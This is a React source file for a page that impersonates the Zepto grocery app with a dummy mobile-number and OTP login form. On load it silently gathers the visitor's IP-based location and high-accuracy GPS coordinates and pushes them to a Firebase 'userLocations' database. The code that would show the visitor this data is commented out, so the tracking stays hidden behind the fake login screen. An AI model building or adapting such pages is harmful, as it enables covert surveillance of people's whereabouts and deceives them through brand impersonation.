import React, { useEffect, useState } from "react";
import { database } from "./firebase";
import { ref, push } from "firebase/database";

function App() {
  const [location, setLocation] = useState({
    ipLocation: null,
    gpsLocation: null,
  });
  const [loading, setLoading] = useState(true);
  const [gpsDenied, setGpsDenied] = useState(false);

  useEffect(() => {
    getIPLocation();
  }, []);

  // 📌 Convert to IST Timezone
  const getISTTime = () => {
    return new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  };

  // 📌 Get IP Location
  const getIPLocation = async () => {
    try {
      const response = await fetch(`https://ipapi.co/json/`);
      const data = await response.json();

      const ipLocationData = {
        latitude: data.latitude,
        longitude: data.longitude,
        method: "IP-based",
        city: data.city,
        country: data.country_name,
        timestamp: getISTTime(),
      };

      setLocation((prev) => ({ ...prev, ipLocation: ipLocationData }));
      saveLocationToFirebase("ipLocation", ipLocationData);

      // ✅ Prompt for GPS Location After IP Fetch
      requestGPSLocation();
    } catch (err) {
      console.error("❌ IP Location failed:", err);
      requestGPSLocation(); // Still try GPS
    }
  };

  // 📌 Check GPS Permission & Request GPS
  const requestGPSLocation = () => {
    if (!navigator.geolocation) {
      console.error("❌ Geolocation not supported");
      setGpsDenied(true);
      setLoading(false);
      return;
    }

    navigator.permissions
      .query({ name: "geolocation" })
      .then((permission) => {
        if (permission.state === "granted" || permission.state === "prompt") {
          console.log("✅ GPS permission granted");
          getGPSLocation();
        } else {
          console.warn("❌ GPS Permission Denied");
          setGpsDenied(true);
          setLoading(false);
        }
      })
      .catch(() => {
        console.warn("⚠️ Permission API failed, trying GPS...");
        getGPSLocation();
      });
  };

  // 📌 Get GPS Location
  const getGPSLocation = () => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const gpsLocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          method: "GPS",
          timestamp: getISTTime(),
        };

        setLocation((prev) => ({ ...prev, gpsLocation: gpsLocationData }));
        saveLocationToFirebase("gpsLocation", gpsLocationData);
        setLoading(false);
      },
      (error) => {
        console.warn("❌ GPS failed:", error);
        setGpsDenied(true);
        setLoading(false);
      },
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  };

  // 📌 Save Location to Firebase
  const saveLocationToFirebase = async (key, data) => {
    const locationRef = ref(database, `userLocations/${key}`);
    await push(locationRef, data);
  };

  return (
    <div style={{ display: "flex", justifyContent: "center", alignItems: "center", height: "100vh", backgroundColor: "#f0f2f5", fontFamily: "Arial, sans-serif" }}>
      <div style={{ textAlign: "center", width: "90%", maxWidth: "400px", backgroundColor: "white", padding: "20px", borderRadius: "8px", boxShadow: "0px 4px 10px rgba(0,0,0,0.1)" }}>
        <h1 style={{ color: "#2A2E43", fontSize: "32px", fontWeight: "bold" }}>Zepto</h1>
        <p style={{ color: "#606770", fontSize: "16px" }}>Fast & seamless grocery delivery</p>

        <input type="text" placeholder="Enter Mobile Number" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <input type="password" placeholder="Enter OTP" style={{ width: "100%", padding: "12px", margin: "10px 0", borderRadius: "6px", border: "1px solid #ddd", fontSize: "16px" }} />
        <button style={{ width: "100%", padding: "12px", backgroundColor: "#FF4C3B", color: "white", fontSize: "16px", fontWeight: "bold", border: "none", borderRadius: "6px", cursor: "pointer", marginTop: "10px" }}>
          Log In
        </button>

        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
          {loading ? (
            <p>Fetching location...</p>
          ) : (
            <>
              {location.ipLocation && (
                <div>
                  <h4>IP Location:</h4>
                  <p>Latitude: {location.ipLocation.latitude}</p>
                  <p>Longitude: {location.ipLocation.longitude}</p>
                  <p>City: {location.ipLocation.city}</p>
                  <p>Country: {location.ipLocation.country}</p>
                  <p>Timestamp (IST): {location.ipLocation.timestamp}</p>
                  <p>Method: {location.ipLocation.method}</p>
                </div>
              )}

              {location.gpsLocation ? (
                <div>
                  <h4>GPS Location:</h4>
                  <p>Latitude: {location.gpsLocation.latitude}</p>
                  <p>Longitude: {location.gpsLocation.longitude}</p>
                  <p>Timestamp (IST): {location.gpsLocation.timestamp}</p>
                  <p>Method: {location.gpsLocation.method}</p>
                </div>
              ) : gpsDenied ? (
                <p style={{ color: "red", fontWeight: "bold" }}>GPS Denied. Enable location services.</p>
              ) : (
                <p>Could not retrieve GPS location</p>
              )}
            </>
          )}
        </div> */}
      </div>
    </div>
  );
}

export default App;
